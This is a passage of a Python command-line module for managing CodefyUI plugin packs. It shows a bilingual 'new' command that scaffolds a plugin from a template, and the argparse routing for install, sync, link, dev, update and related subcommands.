    "# Built bundle the editor imports; `cd ui && pnpm install && pnpm build`\n"
    "# emits it. Commit the built frontend/index.js.\n"
    'entry = "frontend/index.js"\n'
)


def _titleize(plugin_id: str) -> str:
    """`my-cool-plugin` -> `My Cool Plugin` (default display name)."""
    return " ".join(word.capitalize() for word in plugin_id.split("-") if word)


def _render(text: str, ctx: dict[str, str]) -> str:
    """Substitute ``{{token}}`` placeholders. Tokens absent from a file are a
    no-op, so the same renderer runs over every payload file uniformly."""
    for key, value in ctx.items():
        text = text.replace("{{" + key + "}}", value)
    return text


def cmd_new(args: argparse.Namespace) -> int:
    """Scaffold a new plugin directory from the built-in template.

    Generates a ready-to-edit plugin: manifest, an example node, a test + the
    ``cdui_plugins.<id>`` namespace shim, and (with ``--ui``) a React frontend
    wired to the typed SDK. Link it immediately with ``cdui plugin dev``.
    """
    plugin_id = args.id.lower()
    section(f"建立新外掛：{plugin_id}", f"Creating new plugin: {plugin_id}")

    if not PLUGIN_ID_RE.match(plugin_id):
        err(
            f"無效的 id：{plugin_id!r}（需符合 {PLUGIN_ID_RE.pattern}）",
            f"Invalid plugin id {plugin_id!r} (must match {PLUGIN_ID_RE.pattern})",
        )
        return 2
    if plugin_id in load_catalog().get("plugins", {}):
        err(
            f"id '{plugin_id}' 與內建套件保留名稱衝突，請換一個",
            f"id '{plugin_id}' is reserved by the built-in catalog — pick another",
        )
        return 2
    if not _TEMPLATE_ROOT.is_dir():
        err(
            f"找不到範本目錄：{_TEMPLATE_ROOT}",
            f"Scaffold template not found at {_TEMPLATE_ROOT}",
        )
        return 1

    base = Path(args.dir).expanduser().resolve() if args.dir else Path.cwd()
    dest = base / plugin_id
    if dest.exists() and any(dest.iterdir()) and not args.force:
        err(
            f"目標目錄已存在且非空：{dest}（加 --force 覆寫）",
            f"Destination exists and is not empty: {dest} (use --force to write into it)",
        )
        return 1

    snake = plugin_id.replace("-", "_")
    name = args.name or _titleize(plugin_id)
    ctx = {"plugin_id": plugin_id, "plugin_snake": snake, "plugin_name": name}
    include_ui = bool(args.ui)

    created = 0
    for src in sorted(_TEMPLATE_ROOT.rglob("*")):
        rel = src.relative_to(_TEMPLATE_ROOT)
        # The ui/ subtree ships only when the author opts in with --ui.
        if not include_ui and rel.parts and rel.parts[0] == "ui":
            continue
        target = dest / rel
        if src.is_dir():
            target.mkdir(parents=True, exist_ok=True)
            continue
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(
            _render(src.read_text(encoding="utf-8"), ctx),
            encoding="utf-8",
            newline="\n",
        )
        created += 1

    if include_ui:
        manifest = dest / MANIFEST_FILENAME
        manifest.write_text(
            manifest.read_text(encoding="utf-8") + _FRONTEND_STANZA,
            encoding="utf-8",
            newline="\n",
        )

    ok(f"已建立 {created} 個檔案於 {dest}", f"Created {created} files in {dest}")
    section("後續步驟", "Next steps")
    info(
        "1. 編輯 nodes/example_node.py，換成你的節點",
        "1. Edit nodes/example_node.py — replace it with your node",
    )
    step = 2
    if include_ui:
        info("2. cd ui && pnpm install && pnpm build", "2. cd ui && pnpm install && pnpm build")
        step = 3
    info(
        f"{step}. cdui plugin dev \"{dest}\"（連結 + 監看 + 熱重載）",
        f"{step}. cdui plugin dev \"{dest}\"  (link + watch + hot-reload)",
    )
    return 0


# ── argparse routing ───────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="cdui plugin", description="Manage CodefyUI plugin packs")
    sub = p.add_subparsers(dest="plugin_cmd", required=True)

    p_inst = sub.add_parser("install", help="Install one or more plugin packs")
    p_inst.add_argument("source", nargs="+",
                        help="catalog name(s), owner/repo[@ref], or GitHub URL — one or more")
    p_inst.add_argument("--force", action="store_true",
                        help="reinstall over an existing version")
    p_inst.add_argument("--no-confirm", "-y", action="store_true",
                        help="skip the URL-install confirmation prompt")
    p_inst.add_argument(
        "--trust-author",
        action="store_true",
        help="accept a third-party plugin's declared [security].allowed_modules",
    )
    p_inst.add_argument(
        "--accept-capabilities",
        action="store_true",
        help=(
            "grant the [security].capabilities the manifest declares without "
            "the interactive prompt (required in scripts and CI)"
        ),
    )
    p_inst.set_defaults(_func=cmd_install)

    p_sync = sub.add_parser(
        "sync",
        help=(
            "Install every built-in pack this install has not decided about yet "
            "(packs you uninstalled stay uninstalled)"
        ),
    )
    p_sync.add_argument("--dry-run", action="store_true",
                        help="list what would be installed and change nothing")
    p_sync.add_argument("--yes", "-y", action="store_true",
                        help="install without the confirmation prompt (required with no terminal)")
    p_sync.add_argument(
        "--prune",
        action="store_true",
        help=(
            "also drop lockfile entries for built-in packs that no longer ship, "
            "which discovery otherwise skips in silence"
        ),
    )
    p_sync.set_defaults(_func=cmd_sync)

    p_list = sub.add_parser("list", help="List installed plugins")
    p_list.set_defaults(_func=cmd_list)

    p_un = sub.add_parser(
        "uninstall",
        help=(
            "Remove an installed plugin. A built-in pack is also remembered as "
            "removed, so `cdui plugin sync` leaves it alone until you install it "
            "by name again"
        ),
    )
    p_un.add_argument("plugin_id")
    p_un.set_defaults(_func=cmd_uninstall)

    p_link = sub.add_parser(
        "link",
        help="Link a local plugin directory for development (loaded in place, no copy)",
    )
    p_link.add_argument("path", help="path to the local plugin dir (contains cdui.plugin.toml)")
    p_link.add_argument("--force", action="store_true",
                        help="overwrite an existing entry with the same id")
    p_link.set_defaults(_func=cmd_link)

    p_unlink = sub.add_parser(
        "unlink",
        help="Remove a linked local plugin (lockfile entry only; your files are untouched)",
    )
    p_unlink.add_argument("plugin_id")
    p_unlink.set_defaults(_func=cmd_unlink)

    p_reload = sub.add_parser(
        "reload",
        help="Hot-reload the running server's plugins/nodes (pick up edits to a linked plugin)",
    )
    p_reload.set_defaults(_func=cmd_reload)

    p_dev = sub.add_parser(
        "dev",
        help="Link a local plugin and watch it — hot-reload on every change",
    )
    p_dev.add_argument("path", help="path to the local plugin dir (contains cdui.plugin.toml)")
    p_dev.add_argument("--interval", type=float, default=1.0,
                       help="seconds between change checks (default 1.0)")
    p_dev.add_argument("--once", action="store_true",
                       help="link + reload once and exit (no watch)")
    p_dev.set_defaults(_func=cmd_dev)

    p_new = sub.add_parser(
        "new",
        help="Scaffold a new plugin directory from the built-in template",
    )
    p_new.add_argument("id", help="new plugin id (lowercase kebab-case)")
    p_new.add_argument("--name", default=None,
                       help="display name (default: derived from the id)")
    p_new.add_argument("--ui", action="store_true",
                       help="include a React frontend (ui/) wired to the SDK")
    p_new.add_argument("--dir", default=None,
                       help="parent directory to create the plugin in (default: cwd)")
    p_new.add_argument("--force", action="store_true",
                       help="write into an existing non-empty directory")
    p_new.set_defaults(_func=cmd_new)

    p_en = sub.add_parser(
        "enable",
        help="Activate an installed plugin (write enabled=true to lockfile)",
    )
    p_en.add_argument("plugin_id")
    p_en.set_defaults(_func=cmd_enable)

    p_dis = sub.add_parser(
        "disable",
        help="Deactivate an installed plugin without uninstalling — files stay on disk",
    )
    p_dis.add_argument("plugin_id")
    p_dis.set_defaults(_func=cmd_disable)

    p_info = sub.add_parser("info", help="Show manifest + lockfile details for a plugin")
    p_info.add_argument("source_or_id",
                        help="installed plugin id, catalog name, or remote source")
    p_info.set_defaults(_func=cmd_info)

    p_up = sub.add_parser("update", help="Re-resolve SHA from the recorded ref and reinstall if changed")
    p_up.add_argument("plugin_id", nargs="?", default=None,
                      help="plugin id to update (omit for all installed third-party packs)")
    p_up.set_defaults(_func=cmd_update)

    p_search = sub.add_parser("search", help="Search the first-party catalog")
    p_search.add_argument("query", nargs="?", default="",
                          help="substring against id / name / description / chapters / tags")
    p_search.set_defaults(_func=cmd_search)

    return p


def main(argv: list[str] | None = None) -> int:
    _reconfigure_stdio()
    parser = build_parser()
    args = parser.parse_args(argv)
    return args._func(args)


if __name__ == "__main__":
    sys.exit(main())
